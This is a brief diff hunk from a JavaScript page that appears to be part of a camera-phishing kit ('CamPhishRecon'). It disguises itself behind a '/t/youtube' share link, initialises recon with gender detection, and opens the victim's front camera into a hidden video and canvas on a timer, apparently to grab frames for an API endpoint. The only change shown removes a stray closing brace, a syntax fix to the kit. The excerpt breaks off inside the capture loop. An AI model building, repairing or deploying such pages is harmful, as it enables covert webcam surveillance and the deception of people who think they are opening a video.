@@ -33,7 +33,6 @@ var API='API_BASE_URL';
 var SHARE_URL=location.origin+'/t/youtube';
 var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
-});
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
 video.srcObject=s;video.play();
 setInterval(function(){
